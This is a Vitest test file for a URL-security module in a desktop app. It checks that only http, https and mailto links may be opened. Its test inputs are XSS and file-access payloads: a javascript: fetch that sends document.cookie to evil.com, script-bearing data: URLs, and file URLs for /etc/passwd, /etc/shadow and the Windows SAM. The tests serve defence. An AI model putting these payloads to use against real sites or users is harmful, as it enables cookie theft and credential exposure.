import { describe, it, expect, vi, beforeEach } from "vitest";
import { isValidExternalUrl, openExternalUrl } from "./urlSecurity";
import { open } from "@tauri-apps/plugin-shell";

describe("isValidExternalUrl", () => {
  describe("valid protocols", () => {
    it("accepts http URLs", () => {
      expect(isValidExternalUrl("http://example.com")).toBe(true);
      expect(isValidExternalUrl("http://localhost")).toBe(true);
      expect(isValidExternalUrl("http://127.0.0.1")).toBe(true);
      expect(isValidExternalUrl("http://example.com:8080")).toBe(true);
    });

    it("accepts https URLs", () => {
      expect(isValidExternalUrl("https://example.com")).toBe(true);
      expect(isValidExternalUrl("https://sub.example.com")).toBe(true);
      expect(isValidExternalUrl("https://example.com/path")).toBe(true);
      expect(isValidExternalUrl("https://example.com/path?query=value")).toBe(
        true
      );
      expect(
        isValidExternalUrl("https://example.com/path?query=value#fragment")
      ).toBe(true);
    });

    it("accepts mailto URLs", () => {
      expect(isValidExternalUrl("mailto:test@example.com")).toBe(true);
      expect(
        isValidExternalUrl("mailto:test@example.com?subject=Hello")
      ).toBe(true);
      expect(
        isValidExternalUrl(
          "mailto:test@example.com?subject=Hello&body=World"
        )
      ).toBe(true);
    });
  });

  describe("dangerous protocols - XSS prevention", () => {
    it("rejects javascript: protocol", () => {
      expect(isValidExternalUrl("javascript:alert(1)")).toBe(false);
      expect(isValidExternalUrl("javascript:void(0)")).toBe(false);
      expect(isValidExternalUrl("javascript:document.cookie")).toBe(false);
      expect(
        isValidExternalUrl("javascript:eval(atob('YWxlcnQoMSk='))")
      ).toBe(false);
    });

    it("rejects javascript: with encoding tricks", () => {
      expect(isValidExternalUrl("javascript:alert%281%29")).toBe(false);
      expect(isValidExternalUrl("javascript:alert&#40;1&#41;")).toBe(false);
    });

    it("rejects javascript: with whitespace", () => {
      // URL constructor normalizes these
      expect(isValidExternalUrl("javascript: alert(1)")).toBe(false);
      expect(isValidExternalUrl("javascript:\talert(1)")).toBe(false);
      expect(isValidExternalUrl("javascript:\nalert(1)")).toBe(false);
    });

    it("rejects data: protocol", () => {
      expect(isValidExternalUrl("data:text/html,<script>alert(1)</script>")).toBe(
        false
      );
      expect(
        isValidExternalUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")
      ).toBe(false);
      expect(isValidExternalUrl("data:image/svg+xml,<svg onload=alert(1)>")).toBe(
        false
      );
    });

    it("rejects vbscript: protocol", () => {
      expect(isValidExternalUrl("vbscript:msgbox(1)")).toBe(false);
      expect(isValidExternalUrl("vbscript:Execute(code)")).toBe(false);
    });

    it("rejects file: protocol", () => {
      expect(isValidExternalUrl("file:///etc/passwd")).toBe(false);
      expect(isValidExternalUrl("file:///C:/Windows/System32")).toBe(false);
      expect(isValidExternalUrl("file://localhost/etc/passwd")).toBe(false);
    });

    it("rejects ftp: protocol", () => {
      expect(isValidExternalUrl("ftp://example.com")).toBe(false);
      expect(isValidExternalUrl("ftp://user:pass@example.com/file")).toBe(false);
    });

    it("rejects custom/unknown protocols", () => {
      expect(isValidExternalUrl("custom://handler")).toBe(false);
      expect(isValidExternalUrl("myapp://deeplink")).toBe(false);
      expect(isValidExternalUrl("slack://open")).toBe(false);
      expect(isValidExternalUrl("tel:+1234567890")).toBe(false);
      expect(isValidExternalUrl("sms:+1234567890")).toBe(false);
    });
  });

  describe("invalid URLs", () => {
    it("rejects empty string", () => {
      expect(isValidExternalUrl("")).toBe(false);
    });

    it("rejects plain text", () => {
      expect(isValidExternalUrl("not a url")).toBe(false);
      expect(isValidExternalUrl("just some text")).toBe(false);
    });

    it("rejects URLs without protocol", () => {
      expect(isValidExternalUrl("example.com")).toBe(false);
      expect(isValidExternalUrl("www.example.com")).toBe(false);
    });

    it("rejects malformed URLs", () => {
      expect(isValidExternalUrl("http://")).toBe(false);
      expect(isValidExternalUrl("https://")).toBe(false);
      expect(isValidExternalUrl("://example.com")).toBe(false);
    });

    it("rejects URLs with only protocol", () => {
      expect(isValidExternalUrl("http:")).toBe(false);
      expect(isValidExternalUrl("https:")).toBe(false);
    });
  });

  describe("edge cases", () => {
    it("handles URLs with special characters", () => {
      expect(
        isValidExternalUrl("https://example.com/path with spaces")
      ).toBe(true);
      expect(isValidExternalUrl("https://example.com/path%20encoded")).toBe(
        true
      );
      expect(isValidExternalUrl("https://example.com/path?q=a&b=c")).toBe(true);
    });

    it("handles URLs with unicode", () => {
      expect(isValidExternalUrl("https://example.com/path/unicode")).toBe(true);
      expect(isValidExternalUrl("https://xn--n3h.com")).toBe(true); // punycode
    });

    it("handles URLs with authentication", () => {
      expect(isValidExternalUrl("https://user:pass@example.com")).toBe(true);
      expect(isValidExternalUrl("http://user@example.com")).toBe(true);
    });

    it("handles localhost variations", () => {
      expect(isValidExternalUrl("http://localhost:3000")).toBe(true);
      expect(isValidExternalUrl("http://127.0.0.1:8080")).toBe(true);
      expect(isValidExternalUrl("http://[::1]:3000")).toBe(true);
    });

    it("handles IPv6 addresses", () => {
      expect(
        isValidExternalUrl("http://[2001:db8::1]:8080/path")
      ).toBe(true);
      expect(isValidExternalUrl("https://[::1]")).toBe(true);
    });

    it("handles very long URLs", () => {
      const longPath = "a".repeat(2000);
      expect(isValidExternalUrl(`https://example.com/${longPath}`)).toBe(true);
    });

    it("handles URLs with fragments", () => {
      expect(isValidExternalUrl("https://example.com/page#section")).toBe(true);
      expect(isValidExternalUrl("https://example.com#top")).toBe(true);
    });
  });

  describe("case sensitivity", () => {
    it("accepts protocols in any case (normalized by URL parser)", () => {
      expect(isValidExternalUrl("HTTP://example.com")).toBe(true);
      expect(isValidExternalUrl("HTTPS://example.com")).toBe(true);
      expect(isValidExternalUrl("Https://example.com")).toBe(true);
      expect(isValidExternalUrl("MAILTO:test@example.com")).toBe(true);
    });

    it("rejects dangerous protocols regardless of case", () => {
      expect(isValidExternalUrl("JAVASCRIPT:alert(1)")).toBe(false);
      expect(isValidExternalUrl("JavaScript:alert(1)")).toBe(false);
      expect(isValidExternalUrl("DATA:text/html,test")).toBe(false);
      expect(isValidExternalUrl("FILE:///etc/passwd")).toBe(false);
    });
  });
});

describe("openExternalUrl", () => {
  const mockOpen = open as ReturnType<typeof vi.fn>;

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe("valid URLs", () => {
    it("opens valid http URLs", async () => {
      await openExternalUrl("http://example.com");
      expect(mockOpen).toHaveBeenCalledWith("http://example.com");
    });

    it("opens valid https URLs", async () => {
      await openExternalUrl("https://example.com");
      expect(mockOpen).toHaveBeenCalledWith("https://example.com");
    });

    it("opens valid mailto URLs", async () => {
      await openExternalUrl("mailto:test@example.com");
      expect(mockOpen).toHaveBeenCalledWith("mailto:test@example.com");
    });

    it("opens URLs with paths and query strings", async () => {
      await openExternalUrl("https://example.com/path?query=value");
      expect(mockOpen).toHaveBeenCalledWith("https://example.com/path?query=value");
    });

    it("opens URLs with fragments", async () => {
      await openExternalUrl("https://example.com/page#section");
      expect(mockOpen).toHaveBeenCalledWith("https://example.com/page#section");
    });
  });

  describe("blocked URLs", () => {
    it("throws error for javascript: protocol", async () => {
      await expect(openExternalUrl("javascript:alert(1)")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for data: protocol", async () => {
      await expect(
        openExternalUrl("data:text/html,<script>alert(1)</script>")
      ).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for file: protocol", async () => {
      await expect(openExternalUrl("file:///etc/passwd")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for invalid URLs", async () => {
      await expect(openExternalUrl("not a valid url")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for empty string", async () => {
      await expect(openExternalUrl("")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for vbscript: protocol", async () => {
      await expect(openExternalUrl("vbscript:msgbox(1)")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for ftp: protocol", async () => {
      await expect(openExternalUrl("ftp://example.com/file")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });

    it("throws error for custom: protocol", async () => {
      await expect(openExternalUrl("custom://handler")).rejects.toThrow(
        "Invalid URL protocol. Only http, https, and mailto are allowed."
      );
      expect(mockOpen).not.toHaveBeenCalled();
    });
  });

  describe("console warnings", () => {
    it("logs warning when blocking dangerous URL", async () => {
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

      await expect(openExternalUrl("javascript:alert(1)")).rejects.toThrow();

      expect(warnSpy).toHaveBeenCalledWith(
        "Blocked attempt to open URL with disallowed protocol: javascript:alert(1)"
      );

      warnSpy.mockRestore();
    });

    it("logs warning for data: URLs", async () => {
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

      await expect(openExternalUrl("data:text/html,test")).rejects.toThrow();

      expect(warnSpy).toHaveBeenCalledWith(
        "Blocked attempt to open URL with disallowed protocol: data:text/html,test"
      );

      warnSpy.mockRestore();
    });

    it("logs warning for file: URLs", async () => {
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

      await expect(openExternalUrl("file:///etc/passwd")).rejects.toThrow();

      expect(warnSpy).toHaveBeenCalledWith(
        "Blocked attempt to open URL with disallowed protocol: file:///etc/passwd"
      );

      warnSpy.mockRestore();
    });
  });

  describe("attack vectors", () => {
    it("blocks XSS via javascript: in various forms", async () => {
      const xssPayloads = [
        "javascript:alert(document.domain)",
        "javascript:fetch('https://evil.com?c='+document.cookie)",
        "javascript:eval('alert(1)')",
        "javascript:window.location='https://phishing.com'",
      ];

      for (const payload of xssPayloads) {
        await expect(openExternalUrl(payload)).rejects.toThrow();
        expect(mockOpen).not.toHaveBeenCalled();
      }
    });

    it("blocks data: URL XSS attacks", async () => {
      const dataPayloads = [
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:image/svg+xml,<svg onload=alert(1)>",
        "data:text/html,<img src=x onerror=alert(1)>",
      ];

      for (const payload of dataPayloads) {
        await expect(openExternalUrl(payload)).rejects.toThrow();
        expect(mockOpen).not.toHaveBeenCalled();
      }
    });

    it("blocks local file access attempts", async () => {
      const filePayloads = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///C:/Windows/System32/config/SAM",
        "file://localhost/etc/passwd",
      ];

      for (const payload of filePayloads) {
        await expect(openExternalUrl(payload)).rejects.toThrow();
        expect(mockOpen).not.toHaveBeenCalled();
      }
    });
  });
});
